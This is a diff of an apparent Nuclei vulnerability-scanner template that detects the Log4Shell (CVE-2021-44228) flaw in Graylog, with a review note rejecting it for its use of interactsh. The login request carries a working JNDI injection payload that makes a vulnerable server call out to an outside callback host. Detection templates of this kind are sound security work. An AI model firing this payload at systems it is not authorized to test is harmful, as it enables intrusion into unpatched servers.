@@ -1,5 +1,4 @@
 id: graylog-log4j-rce
-
 info:
   name: Graylog (Log4j) - Remote Code Execution
   author: DhiyaneshDK
@@ -13,21 +12,49 @@ info:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
     cve-id: CVE-2021-44228
-    cwe-id: CWE-77
+    cwe-id: CWE-502,CWE-77
     cpe: cpe:2.3:a:graylog:graylog:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
-    shodan-query: title:"Graylog Web Interface"
     product: graylog
+    shodan-query: title:"Graylog Web Interface"
     vendor: graylog
-  tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast,vuln
+    verified: true
+  tags: cve,cve2021,graylog,jndi,kev,log4j,oast,rce,vuln
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
-
 http:
-  - raw:
+  - extractors:
+      - kval:
+          - interactsh_ip
+        type: kval
+      - group: 2
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+      - group: 1
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: header
+        type: word
+        words:
+          - 'X-Graylog-Node-Id:'
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         POST /api/system/sessions HTTP/1.1
         Host: {{Hostname}}
@@ -39,38 +66,3 @@ http:
         Referer: {{BaseURL}}
 
         {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: header
-        words:
-          - 'X-Graylog-Node-Id:'
-
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-# digest: 4a0a00473045022100932477a7a86eae76005f3f5746b37e424e29aa6ca731c6eed47fdb002922df8c0220782a96f4b7669a6232b0f7506731812b6b0de27994a0fa6adb93ba1f1701e063:922c64590222798bb761d5b6d8e72950
